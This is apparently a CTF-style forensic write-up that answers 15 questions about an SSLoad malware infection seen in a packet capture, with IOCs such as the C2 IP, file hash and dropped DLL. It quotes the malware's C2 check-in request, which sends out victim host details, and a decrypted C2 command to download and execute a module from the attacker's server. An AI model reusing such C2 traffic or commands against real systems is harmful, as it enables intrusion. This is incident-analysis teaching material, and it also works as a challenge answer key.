# Interceptor

`85.239.53.219`
`239.255.255.250:1900`: SSDP

## 1. What IP address did the original suspicious traffic come from?

Filtering `http`, we see `10.4.17.101` making `PROPFIND` requests, which are unusual.
Among those requests are some suspicious file fetches: `Desktop.ini` (would be on a Windows PC), `avp.msi` (MSI is used for Windows package installation)

> **ANSWER:** 10.4.17.101

## 2. The attacker downloaded a suspicious file. What is the HTTP method used to retrieve the properties of this file?

> **ANSWER:** PROPFIND

## 3. It appears that this file is malware. What is its filename?

> **ANSWER:** `avp.msi`

## 4. What is the SSDEEP hash of the malware as reported by VirusTotal?

```sh
$ sha256sum avp.msi
dcae57ec4b69236146f744c143c42cc8bdac9da6e991904e6dbf67ec1179286a  avp.msi
```

In [`/details`](https://www.virustotal.com/gui/file/dcae57ec4b69236146f744c143c42cc8bdac9da6e991904e6dbf67ec1179286a/details), check `SSDEEP`.

> **ANSWER:** `24576:BqKxnNTYUx0ECIgYmfLVYeBZr7A9zdfoAX+8UhxcS:Bq6TYCZKumZr7ARdAAO8oxz`

## 5. According to the NeikiAnalytics community comment on VirusTotal, to which family does the malware belong?

> **ANSWER:** ssload

## 6. What is the creation time of the malware?

In [`/details`](https://www.virustotal.com/gui/file/dcae57ec4b69236146f744c143c42cc8bdac9da6e991904e6dbf67ec1179286a/details), check History.

> **ANSWER:** 2009-12-11 11:47:44

## 7. What is the domain name that the malware is trying to connect with?

In [/behavior](https://www.virustotal.com/gui/file/dcae57ec4b69236146f744c143c42cc8bdac9da6e991904e6dbf67ec1179286a/behavior), check "Suspicious DNS Query for IP Lookup Service APIs".

> **ANSWER:** `api.ipify.org`

## 8. What is the IP address that the attacker has consistently used for communication?

In [/behavior](https://www.virustotal.com/gui/file/dcae57ec4b69236146f744c143c42cc8bdac9da6e991904e6dbf67ec1179286a/behavior), check `Network Communication > HTTP requests`.

> **ANSWER:** 85.239.53.219

## 9. Which file, included in the original package, is extracted and utilized by the malware during execution?

In [/behavior](https://www.virustotal.com/gui/file/dcae57ec4b69236146f744c143c42cc8bdac9da6e991904e6dbf67ec1179286a/behavior), check `File system actions > Files opened`.

> **ANSWER:** `forcedelctl.dll`

## 10. What program is used to execute the malware?

In [/behavior](https://www.virustotal.com/gui/file/dcae57ec4b69236146f744c143c42cc8bdac9da6e991904e6dbf67ec1179286a/behavior), check "Msiexec.EXE Initiated Network Connection Over HTTP".

> **ANSWER:** msiexec.exe

## 11. What is the hostname of the compromised machine?

Filter `ip.addr == 10.4.17.101`, and scroll until we see something that looks like a hostname.
In this case, it's a Windows hostname in a request using the [`BROWSER` protocol](https://wiki.wireshark.org/BrowserProtocol).

> **ANSWER:** DESKTOP-FWQ3U4C

## 12. What is the key that was used in the attack?

Filter `ip.src == 10.4.17.101 && http`, and we see some `POST /api/b98c911c-e29c-396e-2990-a7441af79546/tasks` requests.
Follow that HTTP stream and we get a bunch of HTTP requests, including a `POST /api/gateway` containing some very useful information.

```http
POST /api/gateway HTTP/1.1
Connection: Keep-Alive
Content-Type: application/json
Referer: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Content-Length: 170
Host: 85.239.53.219

{"version":"v1.4.0","ip":"173.66.46.97","domain":"WORKGROUP","hostname":"DESKTOP-FWQ3U4C","arch":"x86","os_version":"Windows 6.3.9600","cur_user":"User","owner":"Nevada"}
```

```http
HTTP/1.1 200 OK
Server: nginx
Date: Wed, 17 Apr 2024 19:38:10 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 74
Connection: keep-alive
Referrer-Policy: no-referrer

{"key": "WkZPxBoH6CA3Ok4iI", "id": "b98c911c-e29c-396e-2990-a7441af79546"}
```

> **ANSWER:** WkZPxBoH6CA3Ok4iI

## 13. What is the os_version of the compromised machine?

> **ANSWER:** `Windows 6.3.9600`

## 14. What is the owner name of the compromised machine?

> **ANSWER:** Nevada

## 15. After decrypting the communication from the malware, what command is revealed to be sent to the C2 server?

From [Reimu\_Hakurei's comment](https://www.virustotal.com/gui/file/dcae57ec4b69236146f744c143c42cc8bdac9da6e991904e6dbf67ec1179286a/community):

> **ANSWER:** `{"command": "exe", "args": ["http://85.239.53.219/download?id=Nevada&module=2&filename=None"]}`

